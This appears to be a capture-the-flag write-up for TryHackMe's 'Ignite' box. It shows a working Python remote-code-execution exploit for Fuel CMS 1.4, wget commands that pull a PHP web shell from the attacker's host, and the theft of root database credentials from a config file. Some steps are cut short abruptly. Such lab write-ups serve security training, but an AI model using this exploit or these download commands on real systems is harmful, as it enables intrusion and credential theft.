### HTTP
Navigating to http://http://10.10.164.23/, we get a Getting Started page for Fuel CMS with some useful information in how the database is set up. However /fuel/application/config/database.php is forbidden with our permissions. robots.txt already told us about /fuel/ but, the home page explicitly tells us:
```
To access the FUEL admin, go to:
http://10.10.164.23/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)
```
At http://http://10.10.164.23/fuel, we have a login form which opens with the provided `admin:admin` credentials. Based on the site_docs, we have a couple places to try setting up a reverse shell: Pages, Layouts, and Assets.

Before we go too far, let's search for a exploit for fuelCMS v1.4:
```
root@kali:~/Security/TryHackMe/ignite# searchsploit fuelCMS

------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
After copying the exploit to our working directory, we need to change the `url` variable and comment out the provided proxy since we aren't using Burp Suite.

```

# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1

import requests
import urllib

# url = "http://127.0.0.1:8881"
url = "http://10.10.164.23"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"

	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
```
## Gaining RCE Access
The script works, but prints out unnecessary HTML. It's a bit clunky, but we can confirm we are www-data and grab the usr flag from /home/www-data/flag.txt. Since this is a bit clunky and the connection keeps dropping, we should use [phpbash.php](https://github.com/Arrexel/phpbash).

## Getting a Shell

```
# Attacker
root@kali:~/scripts/phpbash# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.164.23 - - [31/Aug/2020 14:01:59] "GET /phpbash.php HTTP/1.1" 200 -

# Victim 
cmd:"wget http://10.2.37.2:8000/phpbash.php"
```
Navigate to http://10.10.164.23/phpbash.php:
```
www-data@ubuntu:/var/www/html# cat /home/www-data/flag.txt
{censored}
```
## Escalating Privileges
We were told that the database config file can be found in fuel/application/config/database.php, so let's see if we can grab some credentials.
```
www-data@ubuntu:/var/www/html# cat /fuel/application/config/database.php
...
$db['default'] = array(
'dsn' => '',
'hostname' => 'localhost',
'username' => 'root',
'password' => 'mememe',
'database' => 'fuel_schema',
'dbdriver' => 'mysqli',
...
www-data@ubuntu:/var/www/html# su root
su: must be run from a terminal
```
We may have root credentials, but we cannot check since we need to [spawn a TTY shell](netsec.ws/?p=337) to run `su`. Seems phpbash.php was fun but is pretty unstable, so let's `wget` a standard reverse shell.

```
root@kali:~/scripts# python3 -m http.server

I hope you enjoyed the walkthrough.
